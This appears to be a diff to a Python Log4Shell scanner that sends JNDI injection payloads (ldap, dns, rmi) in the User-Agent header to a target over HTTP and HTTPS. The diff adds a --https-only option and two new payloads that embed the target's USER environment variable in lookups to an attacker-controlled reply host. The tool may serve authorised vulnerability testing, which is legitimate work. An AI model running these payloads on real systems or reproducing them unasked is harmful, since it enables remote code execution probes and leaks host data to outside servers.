@@ -33,7 +33,11 @@ def argparsing(exec_file):
                         help="Timeout",
                         default=15,
                         type=int)
-
+    parser.add_argument("--https-only",
+                        dest='httpsonly',
+                        help="Force HTTPS only",
+                        default=False,
+                        action='store_true')
 
     return parser
 
@@ -65,20 +69,26 @@ def check2(schema, url_input, reply_host, payl, timeout):
         logging.error(f"HTTP connection to {schema}{url_input.hostname} URL error: {e}")
 
 
-def deliver(url_input, reply_host, header_name, payl, timeout):
+def deliver(args, url_input, reply_host, header_name, payl, timeout):
     schema = ['http://', 'https://']
 
     for s in schema:
+        if args.httpsonly and s != 'https://':
+            continue
+
         check1(s, url_input, reply_host, header_name, payl, timeout)
         check2(s, url_input, reply_host, payl, timeout)
 
 
-def payload_generation(url_input, reply_host, timeout):
+def payload_generation(args, url_input, reply_host, timeout):
     identifier = uuid.uuid4()
     logging.debug(f"Generated UUID: {identifier}")
 
 
     payloads = []
+    payloads.append(f'${{jndi:ldap://${{env:USER}}.{url_input.hostname}.{reply_host}/test.class}}')
+    payloads.append(f'${{jndi:dns://${{env:USER}}.{url_input.hostname}.{reply_host}:53/test.class}}')
+
     payloads.append(f'${{jndi:ldap://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
     payloads.append(f'${{jndi:dns://{identifier}.{url_input.hostname}.{reply_host}:53/test.class}}')
     payloads.append(f'${{jndi:rmi://{identifier}.{url_input.hostname}.{reply_host}:1099/test.class}}')
@@ -103,7 +113,7 @@ def payload_generation(url_input, reply_host, timeout):
     header_name = 'User-Agent'
 
     for payl in payloads:
-        deliver(url_input, reply_host, header_name, payl, timeout)
+        deliver(args, url_input, reply_host, header_name, payl, timeout)
 
 
 def main():
@@ -122,7 +132,7 @@ def main():
         url_input = urlparse('dummy://' + args.target)
 
     # Generate payload and run it
-    payload_generation(url_input, args.replyfqdn, args.timeout)
+    payload_generation(args, url_input, args.replyfqdn, args.timeout)
 
 
 if __name__ == "__main__":
